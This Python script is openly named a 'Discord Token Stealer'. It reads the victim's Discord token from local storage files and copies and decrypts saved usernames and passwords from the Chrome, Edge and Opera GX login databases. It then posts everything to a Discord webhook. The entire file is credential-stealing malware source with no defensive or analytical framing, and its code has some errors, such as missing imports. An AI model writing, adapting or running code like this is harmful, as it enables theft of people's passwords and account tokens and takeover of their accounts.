import os
import json
import base64
import shutil
import requests

def find_discord_secret():
    discord_path = os.path.expanduser('~') + '/AppData/Roaming/discord/Local Storage/leveldb'
    secret = None
    for file in os.listdir(discord_path):
        if file.startswith('log'):
            continue
        elif file.endswith('.ldb'):
            with open(os.path.join(discord_path, file), 'r', encoding='utf-8', errors='ignore') as f:
                content = f.read()
                if 'token' in content:
                    secret = content.split('"token": "')[1].split('"')[0]
                    break
    return secret

def find_browser_secrets(browser_path):
    login_data_path = os.path.join(browser_path, 'Default', 'Login Data')
    cookies_path = os.path.join(browser_path, 'Default', 'Cookies')
    if os.path.exists(login_data_path):
        shutil.copy2(login_data_path, login_data_path + '.bak')
        conn = sqlite3.connect(login_data_path + '.bak')
        cursor = conn.cursor()
        cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
        secrets = cursor.fetchall()
        conn.close()
        decrypted_secrets = []
        for secret in secrets:
            username = secret[1].encode('utf16', 'surrogatepass')
            password = secret[2].encode('utf16', 'surrogatepass')
            decrypted_username = win32crypt.CryptUnprotectData(username, None, None, None, 0)[1].decode()
            decrypted_password = win32crypt.CryptUnprotectData(password, None, None, None, 0)[1].decode()
            decrypted_secrets.append({
                'url': secret[0],
                'username': decrypted_username,
                'password': decrypted_password
            })
        return decrypted_secrets
    else:
        return []

def send_to_webhook(data):
    webhook_url = 'https://discord.com/api/webhooks/YOUR_WEBHOOK_URL'
    headers = {'Content-Type': 'application/json'}
    payload = {
        'username': 'Discord Token Stealer',
        'embeds': [
            {
                'title': 'Discord Token',
                'description': data['discord_token'],
                'color': 16777215,
                'footer': {
                    'text': 'This message was sent by Discord Token Stealer.'
                }
            },
            {
                'title': 'Browser Credentials',
                'fields': [
                    {
                        'name': cred['url'],
                        'value': f"Username: {cred['username']}, Password: {cred['password']}",
                        'inline': False
                    } for cred in data['browser_creds']
                ],
                'color': 16777215,
                'footer': {
                    'text': 'This message was sent by Discord Token Stealer.'
                }
            }
        ]
    }
    response = requests.post(webhook_url, headers=headers, json=payload)
    if response.status_code == 204:
        print('Data sent successfully to webhook.')
    else:
        print('Failed to send data to webhook.')

def main():
    browsers = ['Chrome', 'Microsoft Edge', 'Opera GX']
    browser_paths = []
    for browser in browsers:
        if browser == 'Chrome':
            browser_paths.append(os.path.join(os.path.expanduser('~'), 'AppData', 'Local', 'Google', browser))
        elif browser == 'Microsoft Edge':
            browser_paths.append(os.path.join(os.path.expanduser('~'), 'AppData', 'Local', 'Microsoft', 'Edge', 'User Data'))
        elif browser == 'Opera GX':
            browser_paths.append(os.path.join(os.path.expanduser('~'), 'AppData', 'Roaming', 'Opera Software', 'Opera GX Stable'))
    
    all_creds = []
    for browser_path in browser_paths:
        creds = find_browser_secrets(browser_path)
        all_creds.extend(creds)
    
    discord_token = find_discord_secret()

    data = {
        'discord_token': discord_token,
        'browser_creds': all_creds
    }

    send_to_webhook(data)

if __name__ == "__main__":
    main()